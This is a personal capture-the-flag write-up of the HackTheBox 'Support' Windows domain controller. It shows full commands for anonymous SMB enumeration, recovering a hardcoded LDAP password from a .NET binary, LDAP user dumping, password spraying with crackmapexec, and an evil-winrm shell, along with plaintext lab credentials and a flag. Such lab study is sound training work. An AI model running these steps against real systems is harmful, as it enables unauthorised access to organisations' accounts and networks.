---
Category: B2R
Difficulty: Easy
Platform: HackTheBox
Retired: false
Status: 2. User
Tags:
  - LDAP-enum
  - Windows
  - hardcoded-credentials
  - password-spraying
  - reversing
  - anonymous-smb
---
![Support.png](../../zzz_res/attachments/Support.png)

***TABLE OF CONTENTS:***

---

# Resolution summary

- Step 1
- Step 2

## Improved skills

- Skill 1
- Skill 2

## Used tools

- nmap
- gobuster

## Video

---

# Information Gathering

Scanned all TCP ports:

```
$ sudo nmap -p- 10.10.11.174 -oA scan/all-tcp-ports -sS -v
...
Completed SYN Stealth Scan at 17:07, 127.80s elapsed (65535 total ports)
Nmap scan report for 10.10.11.174
Host is up (0.039s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49676/tcp open  unknown
49681/tcp open  unknown
49705/tcp open  unknown
63690/tcp open  unknown
```

Enumerated open TCP ports:

```
$ sudo nmap 10.10.11.174 -oA scan/open-tcp-ports -sV -sC -p 139,53,445,135,63690,593,636,3269,464,5985,9389,389,88,3268                                                                                                                1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-26 17:07 CEST
Nmap scan report for 10.10.11.174
Host is up (0.036s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-26 15:08:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
63690/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-08-26T15:08:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.00 seconds
```

Enumerated top 200 UDP ports:

```
┌──(maoutis㉿kali)-[~/CTF/HTB/Support]
└─$ sudo nmap 10.10.11.174 --top-ports 200 -sU -oA scan/top-200-urp-ports
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-26 17:10 CEST
Nmap scan report for 10.10.11.174
Host is up (0.037s latency).
Not shown: 198 open|filtered ports
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds
```

# Enumeration

## Port 139 & Port 445- NetBIOS & SMB

Enumerated open shares:

```
┌──(maoutis㉿kali)-[~/CTF/HTB/Support]
└─$ smbmap -H 10.10.11.174 -u test
[+] Guest session       IP: 10.10.11.174:445    Name: support
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        support-tools                                           READ ONLY       support staff tools
        SYSVOL                                                  NO ACCESS       Logon server share

┌──(maoutis㉿kali)-[~/CTF/HTB/Support]
└─$ smbclient -L 10.10.11.174
Password for [WORKGROUP\maoutis]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

Enumerated support-tools share and downloaded all the files:

```
┌──(maoutis㉿kali)-[~/CTF/HTB/Support]
└─$ smbmap -H 10.10.11.174 -u test -R support-tools
[+] Guest session       IP: 10.10.11.174:445    Name: support
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        support-tools                                           READ ONLY
        .\support-tools\*
        dr--r--r--                0 Wed Jul 20 19:01:06 2022    .
        dr--r--r--                0 Sat May 28 13:18:25 2022    ..
        fr--r--r--          2880728 Sat May 28 13:19:19 2022    7-ZipPortable_21.07.paf.exe
        fr--r--r--          5439245 Sat May 28 13:19:55 2022    npp.8.4.1.portable.x64.zip
        fr--r--r--          1273576 Sat May 28 13:20:06 2022    putty.exe
        fr--r--r--         48102161 Sat May 28 13:19:31 2022    SysinternalsSuite.zip
        fr--r--r--           277499 Wed Jul 20 19:01:07 2022    UserInfo.exe.zip
        fr--r--r--            79171 Sat May 28 13:20:17 2022    windirstat1_1_2_setup.exe
        fr--r--r--         44398000 Sat May 28 13:19:43 2022    WiresharkPortable64_3.6.5.paf.exe

┌──(maoutis㉿kali)-[~/CTF/HTB/Support/loot]
└─$ smbmap -H 10.10.11.174 -u test -R support-tools -A . -q
[+] Guest session       IP: 10.10.11.174:445    Name: support
[+] Starting search for files matching '.' on share support-tools.
[+] Match found! Downloading: support-tools\7-ZipPortable_21.07.paf.exe
[+] Match found! Downloading: support-tools\npp.8.4.1.portable.x64.zip
[+] Match found! Downloading: support-tools\putty.exe
[+] Match found! Downloading: support-tools\SysinternalsSuite.zip
[+] Match found! Downloading: support-tools\UserInfo.exe.zip
[+] Match found! Downloading: support-tools\windirstat1_1_2_setup.exe
[+] Match found! Downloading: support-tools\WiresharkPortable64_3.6.5.paf.exe
```

Reversed the `UserInfo.exe` binary using dnSpy:

![Support%20a7b761a2379b48379b0e46ce6dad2199](../../zzz_res/attachments/Support%20a7b761a2379b48379b0e46ce6dad2199.png)

![Support%20a7b761a2379b48379b0e46ce6dad2199](../../zzz_res/attachments/Support%20a7b761a2379b48379b0e46ce6dad2199%201.png)

![Support%20a7b761a2379b48379b0e46ce6dad2199](../../zzz_res/attachments/Support%20a7b761a2379b48379b0e46ce6dad2199%202.png)

>[!important]
>armando     nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz

## Port 389, 636, 3268, 3269 - LDAP

Enumerated basic LDAP info:

```
# Nmap 7.92 scan initiated Tue Aug 30 15:33:04 2022 as: nmap -vv --reason -Pn -T4 -sV -p 389 "--script=banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /home/kali/CTFs/HTB/B2R/Support/results/10.10.11.174/scans/tcp389/tcp_389_ldap_nmap.txt -oX /home/kali/CTFs/HTB/B2R/Support/results/10.10.11.174/scans/tcp389/xml/tcp_389_ldap_nmap.xml 10.10.11.174
Nmap scan report for support (10.10.11.174)
Host is up, received user-set (0.038s latency).
Scanned at 2022-08-30 15:33:09 EDT for 16s

PORT    STATE SERVICE REASON          VERSION
389/tcp open  ldap    syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=support,DC=htb
|       ldapServiceName: support.htb:dc$@SUPPORT.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       ...
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=support,DC=htb
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb
|       namingContexts: DC=support,DC=htb
|       namingContexts: CN=Configuration,DC=support,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=support,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=support,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 82077
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
|       dnsHostName: dc.support.htb
|       defaultNamingContext: DC=support,DC=htb
|       currentTime: 20220830193315.0Z
|_      configurationNamingContext: CN=Configuration,DC=support,DC=htb
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Enumerated users using LDAP:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Support/scan]
└─$ ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb" > LDAP-users.txt

┌──(kali㉿kali)-[~/…/HTB/B2R/Support/scan]
└─$ cat LDAP-users.txt | grep '@support.htb'
mail: smith.rosario@support.htb
mail: hernandez.stanley@support.htb
mail: wilson.shelby@support.htb
mail: anderson.damian@support.htb
mail: thomas.raphael@support.htb
mail: levine.leopoldo@support.htb
mail: raven.clifton@support.htb
mail: bardot.mary@support.htb
mail: cromwell.gerard@support.htb
mail: monroe.david@support.htb
mail: west.laura@support.htb
mail: langley.lucy@support.htb
mail: daughtler.mabel@support.htb
mail: stoll.rachelle@support.htb
mail: ford.victoria@support.htb

┌──(kali㉿kali)-[~/…/HTB/B2R/Support/scan]
└─$ cat LDAP-users.txt | grep 'cn' | cut -d ' ' -f2 | sort -u
Administrator
Allowed
anderson.damian
bardot.mary
Cert
Cloneable
cromwell.gerard
daughtler.mabel
Denied
DnsAdmins
DnsUpdateProxy
Domain
Enterprise
ford.victoria
Group
Guest
hernandez.stanley
Key
krbtgt
langley.lucy
ldap
levine.leopoldo
monroe.david
Protected
RAS
raven.clifton
Read-only
Schema
Shared
smith.rosario
stoll.rachelle
support
thomas.raphael
Users
west.laura
wilson.shelby

┌──(kali㉿kali)-[~/…/HTB/B2R/Support/scan]
└─$ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Extracted a possible password:

```
┌──(kali㉿kali)-[~/…/HTB/B2R/Support/scan]
└─$ cat LDAP/domain_users.json | jq '.[].attributes | .info'
null
null
null
null
null
null
null
null
null
null
null
null
null
null
null
[
  "Ironside47pleasure40Watchful"
]
null
null
null
null
```

# Exploitation

## Password spraying

Sprayed the discovered possible password against all the discovered account and get an access as *support* user:

```
┌──(kali㉿kali)-[~/…/HTB/B2R/Support/scan]
└─$ crackmapexec winrm 10.10.11.174 -d support -u LDAP/users.txt -p 'Ironside47pleasure40Watchful' -x whoami --continue-on-success
HTTP        10.10.11.174    5985   10.10.11.174     [*] http://10.10.11.174:5985/wsman
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\ldap:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Administrator:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Allowed:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\anderson.damian:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\bardot.mary:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Cert:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Cloneable:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\cromwell.gerard:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\daughtler.mabel:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Denied:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\DnsAdmins:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\DnsUpdateProxy:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Domain:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Enterprise:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\ford.victoria:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Group:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Guest:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\hernandez.stanley:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Key:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\krbtgt:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\langley.lucy:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\ldap:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\levine.leopoldo:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\monroe.david:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Protected:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\RAS:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\raven.clifton:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Read-only:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Schema:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Shared:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\smith.rosario:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\stoll.rachelle:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [+] support\support:Ironside47pleasure40Watchful (Pwn3d!)
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\thomas.raphael:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\Users:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\west.laura:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   10.10.11.174     [-] support\wilson.shelby:Ironside47pleasure40Watchful
```

Accessed using WinRM:

```
┌──(kali㉿kali)-[~/…/HTB/B2R/Support/scan]
└─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\support\Documents> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.174
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
*Evil-WinRM* PS C:\Users\support\Documents> type ..\Desktop\user.txt
2d918e1e0e7b69e35832ecc3fd2c0fe8
```

# Privilege Escalation

## Local enumeration

Enumerated user info:

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Enumerated the domain using SharpHound and Bloodhound:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> .\SharpHound.exe
2022-09-02T08:31:08.6063321-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2022-09-02T08:31:08.7781970-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-02T08:31:08.7938300-07:00|INFORMATION|Initializing SharpHound at 8:31 AM on 9/2/2022
2022-09-02T08:31:09.4189120-07:00|INFORMATION|Loaded cache with stats: 69 ID to type mappings.
 69 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2022-09-02T08:31:09.4189120-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-02T08:31:09.6376187-07:00|INFORMATION|Beginning LDAP search for support.htb
2022-09-02T08:31:09.7000770-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-09-02T08:31:09.7000770-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-09-02T08:31:40.3719958-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
2022-09-02T08:31:55.5282196-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-09-02T08:31:55.5750757-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-09-02T08:31:55.6688437-07:00|INFORMATION|Status: 111 objects finished (+111 2.413043)/s -- Using 43 MB RAM
2022-09-02T08:31:55.6688437-07:00|INFORMATION|Enumeration finished in 00:00:46.0476448
2022-09-02T08:31:55.7938351-07:00|INFORMATION|Saving cache with stats: 70 ID to type mappings.
 70 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2022-09-02T08:31:55.7938351-07:00|INFORMATION|SharpHound Enumeration Completed at 8:31 AM on 9/2/2022! Happy Graphing!

*Evil-WinRM* PS C:\Users\support\Documents> download 20220902083154_BloodHound.zip
Info: Downloading 20220902083154_BloodHound.zip to ./20220902083154_BloodHound.zip

Info: Download successful!
```


# Trophy
 
>[!success]
>**User.txt**
>`2d918e1e0e7b69e35832ecc3fd2c0fe8`

>[!fail]
>**Root.txt**
>rootme

**/etc/shadow**

```bash
shadow
```